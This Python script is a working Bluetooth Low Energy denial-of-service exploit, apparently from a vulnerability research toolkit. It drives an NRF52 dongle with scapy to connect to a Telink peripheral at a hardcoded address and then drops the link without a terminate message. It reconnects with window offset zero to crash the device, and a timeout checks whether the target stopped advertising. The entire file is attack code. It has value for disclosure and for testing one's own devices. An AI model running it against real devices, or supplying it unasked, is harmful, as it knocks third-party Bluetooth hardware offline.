#!/usr/bin/env python

import os
import platform
import sys
from time import sleep

# extra libs
sys.path.insert(0, os.getcwd() + '/libs')
import colorama
from colorama import Fore
from drivers.NRF52_dongle import NRF52Dongle
from scapy.layers.bluetooth4LE import *
from scapy.layers.bluetooth import *
from timeout_lib import start_timeout, disable_timeout, update_timeout
from discover import discover_attacker_dongle

# Default master address
master_address = '5d:36:ac:90:0b:20'
access_address = 0x9a328370
# Normal pairing request for secure pairing (uncomment the following to choose pairing request method)
# pairing_iocap = 0x01  # DisplayYesNo
pairing_iocap = 0x03  # NoInputNoOutput
# pairing_iocap = 0x04  # KeyboardDisplay
# paring_auth_request = 0x00  # No bounding
paring_auth_request = 0x01  # Bounding
# paring_auth_request = 0x08 | + 0x01  # Le Secure Connection + bounding
# paring_auth_request = 0x04 | 0x01  # MITM + bounding
# paring_auth_request = 0x08 | 0x40 | 0x01  # Le Secure Connection + MITM + bounding

# Internal vars
none_count = 0
end_connection = False
connected = False
connecting = False
pairing_procedure = False
attack = True
reset_window_offset = False
conn_request = BTLE() / BTLE_ADV(RxAdd=0, TxAdd=0) / BTLE_CONNECT_REQ()
SCAN_TIMEOUT = 2.5
CRASH_TIMEOUT = 6.0

def crash_timeout():
    global attack, conn_request
    disable_timeout('scan_timeout')
    print(Fore.RED + "No advertisement from " + advertiser_address.upper() +
          ' received\nThe device may have crashed!!!')
    driver.send(conn_request)
    if 'CONTINUE_ATTACK' in os.environ:
        attack = True
    else:
        attack = False


def scan_timeout():
    global connecting, connected, conn_request
    connecting = False
    connected = False
    print("Connection timeout, retrying...")
    start_timeout('scan_timeout', SCAN_TIMEOUT, scan_timeout)
    driver.send(conn_request)


# Autoreset colors
colorama.init(autoreset=True)

# Get serial port from command line
attacker_serial_port = discover_attacker_dongle()
if None in attacker_serial_port:
    print(Fore.RED + 'Platform not identified')
    sys.exit(0)
else:
    serial_port = attacker_serial_port[0]

print(Fore.YELLOW + 'Serial port: ' + serial_port)

# Get advertiser_address from command line (peripheral addr)
if len(sys.argv) >= 2:
    advertiser_address = sys.argv[1].lower()
else:
    advertiser_address = 'c8:c9:a3:d3:65:1e'

print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.upper())

# Open serial port of NRF52 Dongle
driver = NRF52Dongle(serial_port, '115200', logs_pcap=True, pcap_filename='logs/telink_reconnection_dos.pcap')
# Send scan request
scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
    ScanA=master_address,
    AdvA=advertiser_address)



start_timeout('scan_timeout', SCAN_TIMEOUT, scan_timeout)

print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
while attack:
    pkt = None
    # Receive packet from the NRF52 Dongle
    data = driver.raw_receive()
    if data:
        # Decode Bluetooth Low Energy Data
        pkt = BTLE(data)  # Receive plain text Link Layer
        # if packet is incorrectly decoded, you may not be using the dongle
        if pkt is None:
            none_count += 1
            if none_count >= 4:
                print(Fore.RED + 'NRF52 Dongle not detected')
                sys.exit(0)
            continue
        elif BTLE_DATA in pkt:
            update_timeout('scan_timeout')
            update_timeout('crash_timeout')
            if BTLE_EMPTY_PDU not in pkt:
                # Print slave data channel PDUs summary
                print(Fore.MAGENTA + "RX <--- " + pkt.summary()[7:])
        # --------------- Process Link Layer Packets here ------------------------------------
        # Check if packet from advertised is received
        if not connected and BTLE_ADV in pkt and pkt.AdvA == advertiser_address.lower():
            print(Fore.GREEN + advertiser_address.upper() + ': ' + pkt.summary()[7:] + ' Detected')
            update_timeout('scan_timeout')
            update_timeout('crash_timeout')

        if not connected and connecting == False:
            connecting = True

            print(Fore.YELLOW + 'Attempting connection to ' + advertiser_address)
            # Send connection request to advertiser
            conn_request = BTLE() / BTLE_ADV(RxAdd=0, TxAdd=0) / BTLE_CONNECT_REQ(
                InitA=master_address,
                AdvA=advertiser_address,
                AA=access_address,  # Access address (any)
                crc_init=0xe9d01b,  # CRC init (any)
                win_size=1,  # 2.5 of windows size (anchor connection window size)
                win_offset=21,  # 1.25ms windows offset (anchor connection point)
                interval=24,  # 20ms connection interval
                latency=4,  # Slave latency (any)
                timeout=72,  # Supervision timeout, 500ms (any)
                chM=0x1FFFFFFFFF,  # Any
                hop=15,  # Hop increment (any)
                SCA=1,  # Clock tolerance
            )

            if reset_window_offset:
                print(Fore.MAGENTA + "[!] Reconnecting with Window Offset=0")
                reset_window_offset = 0
                conn_request.win_offset = 0

            driver.send(conn_request)
  

        elif BTLE_DATA in pkt and connecting == True:
            connecting = False
            connected = True
            # Start the timeout to detect crashes
            start_timeout('crash_timeout', CRASH_TIMEOUT, crash_timeout)
            print(Fore.GREEN + 'Slave Connected (Link Layer data channel established)')
            # Send Feature request
            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_FEATURE_REQ(
                feature_set='le_encryption+le_data_len_ext')
            driver.send(pkt)
            reset_window_offset = True
        
        # Wait to receive an empty PDU from target peripheral
        elif reset_window_offset and BTLE_EMPTY_PDU in pkt:

            end_connection = False
            connected = False
            print(Fore.YELLOW + 'Ending connection without LL_TERMINATE_IND')



sleep(0.01)
driver.save_pcap()
print(Fore.GREEN + "Capture saved in logs/telink_reconnection_dos.pcap")
